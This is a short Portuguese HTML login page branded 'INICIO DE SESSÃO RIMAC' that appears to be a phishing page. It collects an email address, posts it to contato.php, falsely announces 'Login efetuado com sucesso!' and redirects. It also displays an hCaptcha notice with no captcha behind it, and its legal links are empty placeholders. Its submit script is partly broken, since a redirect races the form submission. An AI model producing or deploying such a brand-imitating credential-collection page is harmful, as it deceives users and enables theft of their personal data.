<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="css/cont.css">
    <script>
        window.onload = function() {
            const form = document.querySelector('form');

            form.onsubmit = function(event) {
                event.preventDefault(); // Previne o envio imediato do formulário
                alert('Login efetuado com sucesso!'); // Exibe a mensagem
                // Submete o formulário ao PHP e depois redireciona
                form.submit(); // Submissão ao PHP
                window.location.href = 'cont2.html'; // Redireciona para outra página após a submissão
            };
        };
    </script>
</head>
<body>
    <div class="pai">
        <div class="login">
         <h1>
          INICIO DE SESSÃO RIMAC
         </h1>
         <p>
          Ainda não tem conta na RIMAC? Registre-se
          <a href="login.html">
           aqui
          </a>
          .
         </p>
         <div class="area">

          <form action="contato.php" method="post">
            <label for="email"></label>
            <input type="email" id="email" name="email" required placeholder="Digite seu Email"> <br><br>
            <button class="botao" type="submit" name="Continuar">Continuar</button>
          </form>
    
         </div>

         <div class="footer">
          <p>
           Esta página usa hCaptcha. Para mais detalhes, consulte a Proteção de Dados ou o Aviso Legal.
          </p> <br><br>
          <div class="link">
              <a href="#">
               Informações Legais
              </a> <br><br>
              <a href="#">
               Política de Privacidade
              </a><br><br>
              <a href="#">

              </a>
          </div>
         </div>
        </div>
        <div class="foto"></div>
       </div>
</body>
</html>
